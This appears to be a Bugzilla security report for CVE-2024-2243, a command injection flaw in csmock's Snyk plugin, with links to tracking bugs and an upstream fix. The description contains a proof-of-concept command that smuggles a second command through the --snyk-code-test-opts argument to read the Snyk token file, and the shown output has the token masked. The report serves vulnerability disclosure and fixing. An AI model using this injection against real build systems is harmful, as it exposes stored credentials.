| [Description](show_bug.cgi?id=2267336#c0)  Robb Gatica    2024-03-01 17:23:45 UTC  ``` csmock, which is used by the OpenScanHub (OSH) service, is vulnerable to a command injection attack. The command is isolated by mock (which internally uses systemd-nspawn) but the Snyk authentication token is accessible while the command is being executed:  $ csmock -r rhel-9-x86_64 -t snyk -f python-certifi-2018.10.15-4.el8ost.src.rpm --snyk-code-test-opts='--help; cat /builddir/.config/configstore/snyk.json #' [...] {         "api": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" }  This vulnerability was introduced by the following commit: <https://github.com/csutils/csmock/commit/73eddc138c8e9c97246dd2d12ad30a2a13bea3f4>   ```  [Comment 1](show_bug.cgi?id=2267336#c1)  Robb Gatica    2024-03-20 15:32:36 UTC  ``` Created csmock tracking bugs for this issue:  Affects: epel-all [[bug 2270495](show_bug.cgi?id=2270495 "CLOSED ERRATA - TRIAGE CVE-2024-2243 csmock: command injection vulnerability in csmock-plugin-snyk [epel-all]")] Affects: fedora-all [[bug 2270496](show_bug.cgi?id=2270496 "CLOSED ERRATA - TRIAGE CVE-2024-2243 csmock: command injection vulnerability in csmock-plugin-snyk [fedora-all]")]   ```  [Comment 2](show_bug.cgi?id=2267336#c2)  Kamil Dudka    2024-03-20 16:17:30 UTC  ``` upstream fix: <https://github.com/csutils/csmock/commit/b3503d48696cb2ec8eb2fb379fb57c141f08e8da>   ``` |  |
